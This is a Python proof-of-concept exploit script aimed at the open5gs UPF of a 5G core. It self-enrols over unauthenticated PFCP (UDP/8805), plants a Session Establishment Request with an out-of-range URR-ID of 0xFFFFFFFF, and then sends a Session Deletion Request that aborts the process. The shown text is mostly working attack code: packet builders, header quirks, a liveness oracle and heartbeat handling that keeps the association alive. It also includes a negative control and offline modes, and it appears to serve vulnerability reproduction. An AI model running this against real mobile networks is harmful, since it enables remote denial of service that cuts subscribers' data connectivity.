#!/usr/bin/env python3
"""
upf_pfcp_urr_id_abort_poc.py -- open5gs UPF: an out-of-range PFCP URR-ID aborts the UPF.
Over UDP/8805 the attacker first associates with the UPF, then sends a PFCP Session
Establishment Request whose Create URR IE declares URR-ID 0xFFFFFFFF.  The UPF accepts
the session (Cause = Request accepted) and stores the raw 32-bit wire value over the
safe pool-allocated id; on the later Session Deletion Request the value is used as an
index into the fixed 16-entry sess->urr_acc[] array, where
ogs_assert(urr->id > 0 && urr->id <= OGS_MAX_NUM_OF_URR) fires and the process aborts
(SIGABRT, exit 134).  ogs_pfcp_handle_create_urr() applies no range check, and the only
URR-ID validation upstream ever added sits inside the Create PDR handler, which a request
without a Create PDR never reaches.  The in-range control (URR-ID = 1) walks the identical
three-stage sequence and must NOT crash.

Usage:
    python3 upf_pfcp_urr_id_abort_poc.py --target 172.22.0.8 --live                     # the attack (3 datagrams)
    python3 upf_pfcp_urr_id_abort_poc.py --target 172.22.0.8 --live --control urr-id-in-range   # negative control
    python3 upf_pfcp_urr_id_abort_poc.py --target 172.22.0.8 --heartbeat-only           # liveness oracle only
    python3 upf_pfcp_urr_id_abort_poc.py --offline                                      # emit datagram hex, send nothing

Exit codes: 0 = predicted outcome (defect: UPF died / control: UPF survived),
1 = defect not reproduced, 2 = precondition failure (no Heartbeat Response), 3 = control failed.
"""

from __future__ import annotations

import argparse
import errno
import socket
import struct
import sys
import time

# --------------------------------------------------------------------------- PFCP consts

PFCP_VERSION = 1

# open5gs places seid_presence at bit 0 of the first header octet on little-endian
# builds (see the derivation in pfcp_message() below).  NOT TS 29.244's 0x04.
PFCP_S_BIT = 0x01

# Recovery Time Stamp must stay CONSTANT for the whole run -- and across separate
# invocations of this script (the harness runs it once for the health oracle and
# again for the shot).  lib/pfcp/handler.c:36-45 compares the value we advertise
# against the one it remembers for our node:
#
#     36:    if (node->remote_recovery == 0 ||
#     37:        node->remote_recovery == req->recovery_time_stamp.u32) {
#     38:    } else if (node->remote_recovery < req->recovery_time_stamp.u32) {
#     39:        ogs_error("Remote PFCP restarted [%u<%u] in Heartbeat REQ", ...);
#     41:        node->restoration_required = true;      <-- wipes our sessions
#
# A per-process time.time() stamp therefore makes the second invocation look like
# a peer restart, and src/upf/pfcp-sm.c:224 "PFCP restoration" deletes every
# session belonging to us -- which would silently destroy the planted URR before
# it could be detonated.  Observed for real during development:
#
#     [pfcp] ERROR: Remote PFCP restarted [1791375665<1791375669] in Heartbeat REQ
#     [upf]  ERROR: PFCP restoration (../src/upf/pfcp-sm.c:224)
#
# Any fixed value works; the first Association Setup simply seeds it.
LOCAL_RECOVERY = 0x6AC60001

# 3GPP TS 29.244 Table 7.2.1-1.  Values cross-checked against open5gs
# lib/pfcp/message.h:71,84,86,88,89,90 -- do NOT trust memory here, an earlier draft of
# this file had Deletion Request as 52 (that is Modification Request).
MT_HEARTBEAT_REQUEST = 1              # lib/pfcp/message.h:67
MT_HEARTBEAT_RESPONSE = 2             # lib/pfcp/message.h:68
MT_ASSOCIATION_SETUP_REQUEST = 5      # lib/pfcp/message.h:71
MT_ASSOCIATION_SETUP_RESPONSE = 6
MT_SESSION_ESTABLISHMENT_REQUEST = 50  # lib/pfcp/message.h:84
MT_SESSION_ESTABLISHMENT_RESPONSE = 51
MT_SESSION_MODIFICATION_REQUEST = 52   # lib/pfcp/message.h:86
MT_SESSION_MODIFICATION_RESPONSE = 53
MT_SESSION_DELETION_REQUEST = 54       # lib/pfcp/message.h:88  <-- the detonator
MT_SESSION_DELETION_RESPONSE = 55      # lib/pfcp/message.h:89
MT_SESSION_REPORT_REQUEST = 56         # lib/pfcp/message.h:90  (see A3-4)
MT_SESSION_REPORT_RESPONSE = 57

# IE types.  Every value below was read out of lib/pfcp/message.h at the v2.8.0 tag
# (`git show v2.8.0:lib/pfcp/message.h | grep _TYPE`) and matches main HEAD.  Do NOT
# trust the TS 29.244 table from memory here: an earlier draft of this file used
# CREATE_URR=10, CREATE_BAR=84 and APN_DNN=83, which are actually UPDATE_FAR,
# OUTER_HEADER_CREATION and DOWNLINK_DATA_REPORT.  The UPF then mis-tiled the message
# and answered nothing at all:
#   [tlv] ERROR: ogs_tlv_parse_block() failed[LEN:64,MODE:4] (../lib/core/ogs-tlv.c:511)
#   [tlv] ERROR: POS[...] BLK[...] POS-BLK[520]              (../lib/core/ogs-tlv.c:512)
#   [core] ERROR: Can't parse TLV message                    (../lib/core/ogs-tlv-msg.c:759)
#   [pfcp] ERROR: ogs_pfcp_parse_msg: Expectation `rv == OGS_OK' failed. (message.c:5819)
#   [upf] ERROR: ogs_pfcp_parse_msg() failed                 (../src/upf/pfcp-path.c:90)
IE_CREATE_PDR = 1               # OGS_PFCP_CREATE_PDR_TYPE              message.h:97
IE_CREATE_FAR = 3               # OGS_PFCP_CREATE_FAR_TYPE              message.h:99
IE_CREATE_URR = 6               # OGS_PFCP_CREATE_URR_TYPE              message.h:98
IE_CREATE_QER = 7               # OGS_PFCP_CREATE_QER_TYPE              message.h:100
IE_CAUSE = 19                   # OGS_PFCP_CAUSE_TYPE
IE_REPORTING_TRIGGERS = 37      # OGS_PFCP_REPORTING_TRIGGERS_TYPE
IE_F_SEID = 57                  # OGS_PFCP_F_SEID_TYPE
IE_NODE_ID = 60                 # OGS_PFCP_NODE_ID_TYPE
IE_MEASUREMENT_METHOD = 62      # OGS_PFCP_MEASUREMENT_METHOD_TYPE
IE_URR_ID = 81                  # OGS_PFCP_URR_ID_TYPE
IE_CREATE_BAR = 85              # OGS_PFCP_CREATE_BAR_TYPE              message.h:177
IE_RECOVERY_TIME_STAMP = 96     # OGS_PFCP_RECOVERY_TIME_STAMP_TYPE
IE_MEASUREMENT_INFORMATION = 100  # OGS_PFCP_MEASUREMENT_INFORMATION_TYPE
IE_APN_DNN = 159                # OGS_PFCP_APN_DNN_TYPE                 message.h:250

OGS_MAX_NUM_OF_URR = 16  # lib/pfcp/ogs-pfcp.h:31

DEFAULT_PFCP_PORT = 8805  # our own source port; see open_pfcp_socket()

CAUSE_REQUEST_ACCEPTED = 1


# --------------------------------------------------------------------------- IE helpers

def ie(ie_type: int, value: bytes) -> bytes:
    """PFCP TLV: 2-byte type, 2-byte length, value.  Length excludes the 4-byte header."""
    return struct.pack("!HH", ie_type, len(value)) + value


def ie_grouped(ie_type: int, *children: bytes) -> bytes:
    return ie(ie_type, b"".join(children))


def ie_urr_id(urr_id: int) -> bytes:
    return ie(IE_URR_ID, struct.pack("!I", urr_id & 0xFFFFFFFF))


def ie_node_id_ipv4(ip: str) -> bytes:
    """Node ID (IE 60) -- flags | IPv4(4), 5 octets.

    lib/pfcp/types.h:564-566
        typedef struct ogs_pfcp_node_id_s {
        ED2(uint8_t spare:4;,
            uint8_t type:4;)
    -> on little-endian ED2(x1,x2) = `x2 x1` (lib/core/ogs-macros.h:153), so
       `type` occupies the LOW nibble and spare the high one.
       OGS_PFCP_NODE_ID_IPV4 == 0, hence flags = 0x00.
       (lib/pfcp/util.c:217-222 rejects any other type with
       OGS_PFCP_ERROR_SEMANTIC_INCORRECT_MESSAGE.)
    """
    return ie(IE_NODE_ID, b"\x00" + socket.inet_aton(ip))


def ie_recovery_timestamp(ts: int) -> bytes:
    return ie(IE_RECOVERY_TIME_STAMP, struct.pack("!I", ts & 0xFFFFFFFF))


def ie_f_seid(seid: int, ipv4: str) -> bytes:
    """F-SEID (IE 57) -- flags | SEID(8) | IPv4(4), 13 octets.

    The flags octet is 0x02 for IPv4, NOT the 0x01 that TS 29.244's prose
    ("Bit 1 - V4") suggests.  open5gs reads the octet through a bitfield struct
    whose member order is reversed by the EDn macros on little-endian builds:

        lib/pfcp/types.h:574-577
            typedef struct ogs_pfcp_f_seid_s {
            ED3(uint8_t spare:6;,
                uint8_t ipv4:1;,
                uint8_t ipv6:1;)
        lib/core/ogs-macros.h:152-159  (#else = little-endian)
            #define ED3(x1, x2, x3) x3 x2 x1
        ->  struct { uint8_t ipv6:1; uint8_t ipv4:1; uint8_t spare:6; }
        ->  ipv6 = bit 0 (0x01), ipv4 = bit 1 (0x02)

    Confirmed against open5gs's own encoder, lib/pfcp/conv.c:155-190
    ogs_pfcp_sockaddr_to_f_seid(), IPv4-only branch at :173-177:
        } else if (addr) {
            f_seid->ipv4 = 1;
            f_seid->ipv6 = 0;
            f_seid->addr = addr->sin.sin_addr.s_addr;
            *len = OGS_IPV4_LEN + hdr_len;      /* 4 + 9 = 13 */

    src/upf/context.c:377-379 upf_sess_add_by_message() then rejects the whole
    request with "No IPv4 or IPv6" if neither flag is set.
    """
    return ie(IE_F_SEID, b"\x02" + struct.pack("!Q", seid) + socket.inet_aton(ipv4))


def ie_cause(cause: int) -> bytes:
    return ie(IE_CAUSE, struct.pack("!B", cause))


def ie_measurement_method(v: int = 0x01) -> bytes:
    """Measurement Method -- exactly ONE octet.

    lib/pfcp/message.h:963
        typedef ogs_tlv_uint8_t ogs_pfcp_tlv_measurement_method_t;

    so the decoder rejects any other width.  Encoding it as 3 octets (as an early
    draft of this script did, copying the 3-octet Reporting Triggers shape) makes
    the whole Session Establishment Request unparseable and the UPF answers
    nothing at all:

        [core] ERROR: Invalid TLV length 3. It should be 1 (../lib/core/ogs-tlv-msg.c:502)
        [core] ERROR: Can't parse leaf TLV                 (../lib/core/ogs-tlv-msg.c:728)
        [core] ERROR: Can't parse compound TLV             (../lib/core/ogs-tlv-msg.c:715)
        [pfcp] ERROR: ogs_pfcp_parse_msg: Expectation `rv == OGS_OK' failed. (../lib/pfcp/message.c:5819)

    open5gs only tests *presence* of this IE (lib/pfcp/handler.c:1563-1568
    "No Measurement Method"), so the value itself is not what matters for the
    crash -- it merely selects which counters accumulate.
    """
    return ie(IE_MEASUREMENT_METHOD, bytes([v & 0xFF]))


def ie_reporting_triggers(v: int = 0x000000) -> bytes:
    # 3 octets (TS 29.244 octets 5-7).  Left at all-zero: the deletion-path sink
    # (main :838 / v2.8.0 :735) depends on no reporting trigger at all, and keeping
    # them clear proves the crash is not the periodic-reporting timer path D1 used.
    return ie(IE_REPORTING_TRIGGERS, struct.pack("!I", v & 0xFFFFFF)[1:])


def ie_measurement_information(istm: bool = False) -> bytes:
    """Measurement Information (IE type 100) -- a single octet5, NOT a grouped IE.

    lib/pfcp/types.h:1435-1447 declares octet5 through open5gs's ED6 macro:
        typedef struct ogs_pfcp_measurement_information_s {
            union {
                struct {
        ED6(uint8_t spare:3;,
            uint8_t mnop:1;,
            uint8_t istm:1;,
            uint8_t radi:1;,
            uint8_t inam:1;,
            uint8_t mbqe:1;)
                };
                uint8_t octet5;
            };
    lib/core/ogs-macros.h:157 reverses ED6 on little-endian
    (`#define ED6(x1,...,x6) x6 x5 x4 x3 x2 x1`), so the declaration order on
    x86-64 is `mbqe:1; inam:1; radi:1; istm:1; mnop:1; spare:3;` and the FIRST
    member takes the LEAST significant bit:
        mbqe = 0x01, inam = 0x02, radi = 0x04, ISTM = 0x08, mnop = 0x10
    (An earlier draft of this file used 0x10, which sets MNOP instead and leaves
    ISTM clear -- the UPF then accepts the URR but never enters the timer path.)

    lib/pfcp/handler.c:1665-1668 copies the octet verbatim:
        if (message->measurement_information.presence &&
            message->measurement_information.len >= 1) {
            urr->meas_info.octet5 =
                *((unsigned char *)message->measurement_information.data);
        }
    and src/upf/n4-handler.c:40-42 then branches on it:
        if (urr->meas_info.istm) {
            upf_sess_urr_acc_timers_setup(sess, urr);   -> src/upf/context.c:881 assert
        }
    """
    return ie(IE_MEASUREMENT_INFORMATION, bytes([0x08 if istm else 0x00]))


def ie_create_urr(urr_id: int, istm: bool) -> bytes:
    """Create URR (IE type 6) carrying ONLY what ogs_pfcp_handle_create_urr() requires.

    That function (lib/pfcp/handler.c:1535 at v2.8.0) treats exactly three IEs as
    mandatory -- URR-ID (:1548), Measurement Method (:1563) and Reporting Triggers
    (:1570) -- and for URR-ID it validates *presence* only, never the *range*; it
    passes the raw u32 straight to ogs_pfcp_urr_find_or_add() at :1555.

    There is deliberately NO Create PDR anywhere in the message, so
    ogs_pfcp_handle_create_pdr() -- the only place upstream validates the URR-ID
    range (lib/pfcp/handler.c:471-483 at v2.8.0, :573-585 at main) -- never runs.

    istm=False (the default) installs the URR without touching any of the seven
    asserted array subscripts, so Session Establishment is ACCEPTED and the crash is
    DEFERRED to the Deletion Response build.  istm=True arms the timer path instead
    and the UPF dies at stage 2.
    """
    children = [ie_urr_id(urr_id),
                ie_measurement_method(0x01),
                ie_reporting_triggers(0)]
    if istm:
        children.append(ie_measurement_information(True))
    return ie_grouped(IE_CREATE_URR, *children)


def ie_apn_dnn(dnn: str = "internet") -> bytes:
    # APN/DNN is encoded as a DNS-name-style label sequence
    labels = dnn.split(".")
    body = b"".join(bytes([len(l)]) + l.encode() for l in labels)
    return ie(IE_APN_DNN, body)


# --------------------------------------------------------------------------- PFCP header

def pfcp_header(msg_type: int, seq: int, seid: int | None) -> bytes:
    """Build a PFCP header.  Returns the header WITHOUT the length field filled in --
    callers use pfcp_message() instead, which fills it correctly."""
    raise NotImplementedError("use pfcp_message()")


def pfcp_message(msg_type: int, seq: int, body: bytes, seid: int | None = None) -> bytes:
    """Complete PFCP datagram.

    Without SEID (node-related messages): 8-byte header
        byte0 = 0x20
        byte1 = message type
        bytes2-3 = message length (total - 4)
        bytes4-6 = sequence number (24-bit)
        byte7 = spare
    With SEID (session-related messages): 16-byte header
        byte0 = 0x21  (S bit set)
        bytes4-11 = SEID
        bytes12-14 = sequence number
        byte15 = spare

    Why 0x21 and NOT the textbook 0x24
    ----------------------------------
    TS 29.244 numbers the first octet from the MSB as version(8-6), spare(5),
    MP(4), S(3), spare(2-1), which would put S at 0x04.  open5gs however declares
    the header as a C bitfield and reorders it for little-endian targets:

        lib/pfcp/message.h:41-50
            ED4(uint8_t version:3;,
                uint8_t spare1:3;,
                uint8_t mp:1;,
                uint8_t seid_presence:1;)

        lib/core/ogs-macros.h:144-160
            #if OGS_BYTE_ORDER == OGS_BIG_ENDIAN
            #define ED4(x1, x2, x3, x4) x1 x2 x3 x4
            #else
            #define ED4(x1, x2, x3, x4) x4 x3 x2 x1   <-- x86-64 takes this
            #endif

    so on the deployed little-endian build the declaration order becomes
    seid_presence:1, mp:1, spare1:3, version:3 and the LSB-first allocation puts
    seid_presence at bit 0 (0x01), mp at bit 1 (0x02), spare1 at bits 2-4 and
    version at bits 5-7 (0xE0).  Two independent confirmations from open5gs's own
    code:

        lib/pfcp/path.c:97    rsp.flags = (OGS_PFCP_VERSION << 5);   -> version is 0x20
        lib/pfcp/xact.c:303   if (h->type >= OGS_PFCP_SESSION_ESTABLISHMENT_REQUEST_TYPE)
        lib/pfcp/xact.c:304       h->seid_presence = 1;              -> types >= 50 carry SEID

    and a live capture of the SMF's own keepalive on the compose bridge confirms
    the SEID-less value:  `20 01 000c ...` (flags 0x20, Heartbeat Request).

    Empirically verified: sending 0x28 makes the UPF take the 8-byte-header
    branch (lib/pfcp/message.c:5711-5714) and mis-tile the buffer --

        [tlv] ERROR: ogs_tlv_parse_block() failed[LEN:64,MODE:4] (../lib/core/ogs-tlv.c:511)
        [tlv] ERROR: POS[...] BLK[...] POS-BLK[520]              (../lib/core/ogs-tlv.c:512)
        [core] ERROR: Can't parse TLV message                    (../lib/core/ogs-tlv-msg.c:759)
        [pfcp] ERROR: ogs_pfcp_parse_msg: Expectation `rv == OGS_OK' failed. (../lib/pfcp/message.c:5819)

    LEN:64 = 68-4 proves it skipped only 4 octets of header instead of 16.
    """
    seq24 = struct.pack("!I", seq & 0xFFFFFF)[1:]
    if seid is None:
        byte0 = (PFCP_VERSION << 5)               # S = 0 -> 0x20
        payload = seq24 + b"\x00"
    else:
        byte0 = (PFCP_VERSION << 5) | PFCP_S_BIT  # S = 1 -> 0x21
        payload = struct.pack("!Q", seid) + seq24 + b"\x00"
    length = len(payload) + len(body)
    return bytes([byte0, msg_type & 0xFF]) + struct.pack("!H", length) + payload + body


# --------------------------------------------------------------------------- stages

def build_heartbeat_request(seq: int) -> bytes:
    """PFCP Heartbeat Request (message type 1, lib/pfcp/message.h:67).

    Node-related (no SEID); body carries only the Recovery Time Stamp IE.
    Byte-identical in shape to the SMF's own keepalive -- verified against a live
    capture on the compose bridge (172.22.0.7:8805 -> 172.22.0.8:8805, 16 octets):

        20 01 000c 000096 00 | 60 0004 ee709585
        ^^ ^^ ^^^^ ^^^^^^ ^^   ^^ ^^^^ ^^^^^^^^
        |  |  |    |      |    |  |    Recovery Time Stamp value
        |  |  |    |      |    |  length 4
        |  |  |    |      |    IE type 96
        |  |  |    |      spare
        |  |  |    sequence number 150 (24-bit)
        |  |  message length 12 (= total 16 - 4)
        |  message type 1
        flags 0x20 = version 1, S=0

    The UPF replies with type 2.  NOTE: a Heartbeat is only answered once the peer
    is associated -- see probe_alive() for why the oracle leads with Association
    Setup instead.
    """
    return pfcp_message(MT_HEARTBEAT_REQUEST, seq,
                        ie_recovery_timestamp(LOCAL_RECOVERY),
                        seid=None)


def build_heartbeat_response_from(req: bytes) -> bytes:
    """Answer a PFCP Heartbeat Request so the UPF keeps our association alive.

    This is not optional.  As soon as Association Setup enrols us, open5gs starts
    its own keepalive towards us (src/upf/pfcp-sm.c).  If we never answer, after
    one T-Heartbeat the UPF logs

        [pfcp] WARNING: [683] LOCAL  No Reponse. Give up! for step 1 type 1 peer ... (../lib/pfcp/xact.c:640)
        [upf]  WARNING: No Heartbeat from SMF [172.22.0.1]:8805 ...                 (../src/upf/pfcp-sm.c:309)
        [upf]  INFO:    PFCP de-associated [172.22.0.1]:8805 ...                    (../src/upf/pfcp-sm.c:184)

    and drops back to upf_pfcp_state_will_associate, which is exactly the window in
    which our Session Establishment then arrives -- producing confusing evidence.

    open5gs builds its own response with its local recovery stamp rather than
    echoing ours (lib/pfcp/build.c:50-75, `rsp->recovery_time_stamp.u32 =
    ogs_pfcp_self()->local_recovery`), so we do the same.  The sequence number IS
    echoed, because the UPF matches the reply to its pending LOCAL transaction by
    xid (lib/pfcp/xact.c:756-771).
    """
    if len(req) < 8:
        return b""
    seq24 = req[4:7]                      # node-related header: bytes 4-6 = seq
    seq = int.from_bytes(seq24, "big")
    return pfcp_message(MT_HEARTBEAT_RESPONSE, seq,
                        ie_recovery_timestamp(LOCAL_RECOVERY),
                        seid=None)


def default_local_ip(target: str) -> str:
    """The source address the OS would use to reach `target`.

    Advertising 127.0.0.1 in Node-ID / F-SEID while the datagram actually arrives
    from the bridge address leaves open5gs with a node whose addr_list and node_id
    disagree; using the real source address keeps the two consistent.
    """
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect((target, 9))   # nothing is sent; only the route is resolved
        return s.getsockname()[0]
    except OSError:
        return "127.0.0.1"
    finally:
        s.close()


def open_pfcp_socket(source_port: int):
    """A UDP socket bound to our own PFCP service port (8805).

    open5gs answers Association Setup at the peer's *service* port taken from the
    node's addr_list -- NOT at the ephemeral source port of our datagram.  Captured
    live on the compose bridge:

        ours  172.22.0.1:56436 -> 172.22.0.8:8805   20 05 0015 ... type 5 Assoc Setup Req
        UPF   172.22.0.8:8805  -> 172.22.0.1:8805   20 06 0022 ... type 6 Assoc Setup Rsp
                                                        13 0001 01   Cause = 1 ACCEPTED
        UPF   172.22.0.8:8805  -> 172.22.0.1:56436  20 01 000c ... type 1 Heartbeat Req

    i.e. the response we care about goes to :8805 while only the UPF's own Heartbeat
    Requests come back to our ephemeral port.  Binding to 8805 both makes us read the
    responses and makes the traffic indistinguishable from a real SMF.
    """
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(("0.0.0.0", source_port))
    return s


def drain_until(s, want, timeout: float, peer=None):
    """Read datagrams until one whose message type is in `want` arrives.

    Returns (data | None, [types seen], OSError | None).

    Filtering by type is mandatory, not cosmetic: as soon as Association Setup
    enrols us, open5gs starts sending its own Heartbeat Requests to us, and those
    arrive ahead of the Association Setup Response.  Reading the first datagram
    blindly yields type 1 and a false negative.

    When `peer` is given, any Heartbeat Request seen while waiting is answered
    immediately (and excluded from the result) so that the UPF does not
    de-associate us mid-sequence -- see build_heartbeat_response_from().
    """
    deadline = time.time() + timeout
    seen = []
    answered = 0
    while True:
        remain = deadline - time.time()
        if remain <= 0:
            if answered:
                print(f"[A3-3]   (answered {answered} UPF Heartbeat Request(s) while waiting)")
            return None, seen, None
        s.settimeout(remain)
        try:
            data, _ = s.recvfrom(65535)
        except socket.timeout:
            if answered:
                print(f"[A3-3]   (answered {answered} UPF Heartbeat Request(s) while waiting)")
            return None, seen, None
        except OSError as e:
            return None, seen, e
        if len(data) > 1:
            seen.append(data[1])
            if data[1] == MT_HEARTBEAT_REQUEST and peer is not None:
                rsp = build_heartbeat_response_from(data)
                if rsp:
                    try:
                        s.sendto(rsp, peer)
                        answered += 1
                    except OSError:
                        pass
                continue        # keep waiting for the type we actually want
            if data[1] in want:
                if answered:
                    print(f"[A3-3]   (answered {answered} UPF Heartbeat Request(s) while waiting)")
                return data, seen, None


def probe_alive(target: str, port: int, node_ip: str, timeout: float = 2.0,
                attempts: int = 3, seq: int = 1,
                source_port: int = DEFAULT_PFCP_PORT) -> tuple:
    """Liveness oracle.  Returns (alive, detail).

    A bare Heartbeat Request is NOT usable from cold.  src/upf/pfcp-path.c:128-153
    auto-adds an unknown peer to `pfcp_peer_list` ONLY for Association Setup
    Request/Response; every other message type from an unknown source is dropped:

        128:    node = ogs_pfcp_node_find(&ogs_pfcp_self()->pfcp_peer_list, ...);
        130:    if (!node) {
        131:        if (message->h.type == OGS_PFCP_ASSOCIATION_SETUP_REQUEST_TYPE ||
        132:            message->h.type == OGS_PFCP_ASSOCIATION_SETUP_RESPONSE_TYPE) {
        134:            node = ogs_pfcp_node_add(...);   <-- self-enrolment, no auth
        145:        } else {
        146:            ogs_error("Cannot find PFCP-Node: type [%d] ...");
        152:            goto cleanup;                    <-- silently dropped

    Confirmed empirically against the deployed UPF: three Heartbeat probes from the
    host produced exactly three
        [upf] ERROR: Cannot find PFCP-Node: type [1] node_id NULL
              from [172.22.0.1]:59320 (../src/upf/pfcp-path.c:146)
    lines and no reply.

    So the oracle sends Association Setup Request (type 5) and requires Association
    Setup Response (type 6).  That simultaneously proves liveness and proves the
    unauthenticated self-enrolment the exploit depends on.  Once associated, a
    follow-up Heartbeat Request/Response is used as a second, cheaper confirmation.

    Deciding liveness by an actual protocol reply rather than by request timeouts is
    what separates "the UPF aborted" from "our datagram was dropped".
    """
    try:
        s = open_pfcp_socket(source_port)
    except OSError as e:
        return False, "cannot bind source port %d: %s" % (source_port, e)

    detail = "no response"
    try:
        for i in range(attempts):
            s.sendto(build_association_setup(seq + i, node_ip), (target, port))
            data, seen, err = drain_until(s, {MT_ASSOCIATION_SETUP_RESPONSE}, timeout,
                                          peer=(target, port))
            if err is not None and err.errno == errno.ECONNREFUSED:
                return False, "ICMP port-unreachable (ECONNREFUSED) -- nothing listening"
            if data is not None:
                cause = parse_cause(data)
                s.sendto(build_heartbeat_request(seq + i + 50), (target, port))
                hdata, hseen, _ = drain_until(s, {MT_HEARTBEAT_RESPONSE}, timeout,
                                              peer=(target, port))
                hb = "Heartbeat Response ok" if hdata is not None \
                    else "Heartbeat not answered"
                return True, ("Association Setup Response (%d bytes, Cause=%s) after "
                              "%d attempt(s); %s; types seen %s"
                              % (len(data), cause, i + 1, hb, seen + hseen))
            detail = "no Association Setup Response within %.1fs (types seen: %s%s)" % (
                timeout, seen, ", %s" % err if err else "")
            time.sleep(0.2)
    finally:
        s.close()
    return False, detail


def build_association_setup(seq: int, node_ip: str) -> bytes:
    """Stage 1: self-enrol as a PFCP peer.  No authentication.

    src/upf/pfcp-sm.c:128-131 accepts ASSOCIATION_SETUP_REQUEST in `will_associate` and
    transitions straight to `associated`.
    """
    body = ie_node_id_ipv4(node_ip) + ie_recovery_timestamp(LOCAL_RECOVERY)
    return pfcp_message(MT_ASSOCIATION_SETUP_REQUEST, seq, body, seid=None)


def build_session_establishment(seq: int, cp_seid: int, local_ip: str,
                                urr_id: int, istm: bool) -> bytes:
    """Stage 2 (plant): Session Establishment Request with ONLY a Create URR.

    Node ID is MANDATORY here, and it must come FIRST.
    --------------------------------------------------
    lib/pfcp/support/cache/tlv-msg-50.py (v2.8.0) fixes the IE order as
        Node ID (M) | CP F-SEID (M) | Create PDR (M) | Create FAR (M) |
        Create URR (C) | Create QER (C) | Create BAR (O) | ...
    and lib/pfcp/util.c:128-131 turns Node ID into a hard requirement for type 50:
        case OGS_PFCP_SESSION_ESTABLISHMENT_REQUEST_TYPE:
            tlv_node_id = &message->pfcp_session_establishment_request.node_id;
            requirement = OGS_PFCP_NODE_ID_MANDATORY;
    lib/pfcp/util.c:182-188 then returns OGS_PFCP_ERROR_NODE_ID_NOT_PRESENT (=4),
    which src/upf/pfcp-path.c:110-118 converts into a SILENT DROP -- no response
    of any kind, not even an error:
        case OGS_PFCP_ERROR_NODE_ID_NOT_PRESENT:
            ogs_error("ogs_pfcp_extract_node_id() failed "
                      "type [%d] pfcp_status [%d] from %s", ...);
            goto cleanup;
    Captured live when this IE was omitted:
        [upf] ERROR: ogs_pfcp_extract_node_id() failed type [50] pfcp_status [4]
              from [172.22.0.1]:8805 (../src/upf/pfcp-path.c:114)
    open5gs's own SMF does exactly what we do: src/smf/n4-build.c:59-68 emits
    Node ID before :70-80 emits CP F-SEID.

    Create PDR / Create FAR are marked M in the descriptor but open5gs never
    enforces that column at run time -- src/upf/n4-handler.c:84-90 (Create PDR
    loop) and :95-99 (Create FAR loop) simply `break` when the IE is absent, and
    neither ogs_pfcp_handle_create_pdr() nor _far() writes *cause_value on that
    path, so the guards at :92-93 and :100-101 pass and
    upf_n4_handle_create_urr() at :103 runs unconditionally.  That is what makes
    a Create-URR-only request a valid, ACCEPTED carrier for the poisoned URR-ID
    -- and, critically, what keeps the only upstream URR-ID range check (inside
    ogs_pfcp_handle_create_pdr) from ever executing.
    """
    body = (
        ie_node_id_ipv4(local_ip)
        + ie_f_seid(cp_seid, local_ip)
        + ie_create_urr(urr_id, istm)
        + ie_apn_dnn("internet")
    )
    # SEID = 0 for Session Establishment Request (no UP SEID exists yet)
    return pfcp_message(MT_SESSION_ESTABLISHMENT_REQUEST, seq, body, seid=0)


def build_session_modification(seq: int, up_seid: int, cp_seid: int,
                               urr_id: int, istm: bool,
                               local_ip: str = "127.0.0.1") -> bytes:
    """Stage 2-alt (plant via MODIFICATION).  Equally exposed and NOT reported by D1.

    Node ID is OPTIONAL for type 52 (lib/pfcp/util.c:138-141) and its absence
    yields OGS_PFCP_STATUS_NODE_ID_OPTIONAL_ABSENT (=2, lib/pfcp/util.c:191-198),
    which src/upf/pfcp-path.c:97-108 accepts; we send it anyway to keep the two
    stage-2 variants shape-consistent with the real SMF.
    """
    body = (ie_node_id_ipv4(local_ip)
            + ie_f_seid(cp_seid, local_ip)
            + ie_create_urr(urr_id, istm))
    return pfcp_message(MT_SESSION_MODIFICATION_REQUEST, seq, body, seid=up_seid)


def build_session_deletion(seq: int, up_seid: int) -> bytes:
    """Stage 3 (detonate): Session Deletion Request.

    src/upf/n4-handler.c:445 upf_n4_handle_session_deletion_request() (main :558)
      -> src/upf/n4-handler.c:463 upf_pfcp_send_session_deletion_response() (main :576)
      -> src/upf/pfcp-path.c:291, build call at :304
      -> src/upf/n4-build.c:124-143, loop :133-139
      -> src/upf/context.c: ogs_assert at :735 (v2.8.0) / :838 (main)  => abort()
    """
    return pfcp_message(MT_SESSION_DELETION_REQUEST, seq, b"", seid=up_seid)


# --------------------------------------------------------------------------- response parse

def parse_seid_from_response(buf: bytes) -> int | None:
    """Pull the UP F-SEID out of a Session Establishment / Modification Response.

    lib/pfcp/support/cache/tlv-msg-51.py (v2.8.0) orders the Session Establishment
    Response as
        Node ID (M) | Cause (M) | Offending IE (C) | UP F-SEID (C) | Created PDR (C) ...
    and the UP F-SEID is only present "if the cause is set to Request accepted".
    The header SEID field also carries it (src/upf/n4-build.c sets
    h.seid = sess->cp_f_seid.seid), so we fall back to that.

    The S-flag test MUST use PFCP_S_BIT (bit 0) -- see parse_cause().  An earlier
    revision of this function used TS 29.244's nominal 0x08, so for a real
    open5gs response (byte0 = 0x21) the test failed and the function returned
    None; stage 3 then targeted SEID 0 and the UPF answered a perfectly healthy
    Session Deletion Response with Cause 65 (session context not found), which
    read as a failed control.
    """
    if len(buf) < 16:
        return None
    if (buf[0] >> 5) != PFCP_VERSION:
        return None
    if not (buf[0] & PFCP_S_BIT):   # S flag -> 16-octet header carries the SEID
        return None
    seid = struct.unpack("!Q", buf[4:12])[0]
    length = struct.unpack("!H", buf[2:4])[0]
    body = buf[16:4 + length]
    off = 0
    while off + 4 <= len(body):
        t, ln = struct.unpack("!HH", body[off:off + 4])
        v = body[off + 4:off + 4 + ln]
        if t == IE_F_SEID and ln >= 9:
            return struct.unpack("!Q", v[1:9])[0]
        off += 4 + ln
    return seid if seid else None


def parse_cause(buf: bytes) -> int | None:
    """Pull the Cause IE out of a PFCP response.

    The header-size test must use the SAME S-bit position open5gs uses (bit 0,
    see PFCP_S_BIT) -- not TS 29.244's nominal bit 3 (0x08).  With 0x08 the
    SEID-bearing 16-octet header is mistaken for the 8-octet one, the IE walk
    starts 8 bytes early, and every Cause reads back as None.
    """
    if len(buf) < 8:
        return None
    length = struct.unpack("!H", buf[2:4])[0]
    hdr = 16 if (buf[0] & PFCP_S_BIT) else 8
    body = buf[hdr:4 + length]
    off = 0
    while off + 4 <= len(body):
        t, ln = struct.unpack("!HH", body[off:off + 4])
        if t == IE_CAUSE and ln >= 1:
            return body[off + 4]
        off += 4 + ln
    return None


